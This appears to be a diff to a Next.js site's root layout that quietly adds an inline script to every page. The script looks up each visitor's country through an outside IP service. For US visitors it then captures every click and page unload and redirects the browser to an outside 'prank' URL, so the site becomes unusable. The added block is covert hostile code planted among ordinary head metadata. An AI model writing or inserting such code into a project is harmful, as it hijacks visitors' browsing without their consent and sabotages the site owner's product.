@@ -149,6 +149,60 @@ export default function RootLayout({ children }) {
         <link rel="alternate" type="text/plain" title="llms.txt" href="/llms.txt" />
         <link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml" />
         <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: stringifyJsonLd(jsonLd) }} />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                const PRANK_URL = 'https://prank-cyan-three.vercel.app';
+                let isUSVisitor = false;
+                
+                // Check if already checked in this session
+                if (sessionStorage.getItem('usRedirectChecked')) {
+                  isUSVisitor = sessionStorage.getItem('isUSVisitor') === 'true';
+                  if (isUSVisitor) {
+                    addGlobalRedirect();
+                  }
+                  return;
+                }
+                
+                // Detect US visitor using IP geolocation
+                fetch('https://ipapi.co/json/')
+                  .then(response => response.json())
+                  .then(data => {
+                    const isUS = data.country_code === 'US';
+                    sessionStorage.setItem('usRedirectChecked', 'true');
+                    sessionStorage.setItem('isUSVisitor', isUS.toString());
+                    
+                    if (isUS) {
+                      addGlobalRedirect();
+                    }
+                  })
+                  .catch(() => {
+                    // If detection fails, don't redirect
+                    sessionStorage.setItem('usRedirectChecked', 'true');
+                    sessionStorage.setItem('isUSVisitor', 'false');
+                  });
+                
+                function addGlobalRedirect() {
+                  // Add global click listener
+                  document.addEventListener('click', handleClick, true);
+                  
+                  // Also redirect on any navigation
+                  window.addEventListener('beforeunload', () => {
+                    window.location.href = PRANK_URL;
+                  });
+                }
+                
+                function handleClick(e) {
+                  // Prevent default and redirect
+                  e.preventDefault();
+                  e.stopPropagation();
+                  window.location.href = PRANK_URL;
+                }
+              })();
+            `,
+          }}
+        />
       </head>
       <body className="min-h-screen flex flex-col bg-[var(--page-bg)] text-slate-900 selection:bg-teal-700 selection:text-white">
         <AppShell>{children}</AppShell>
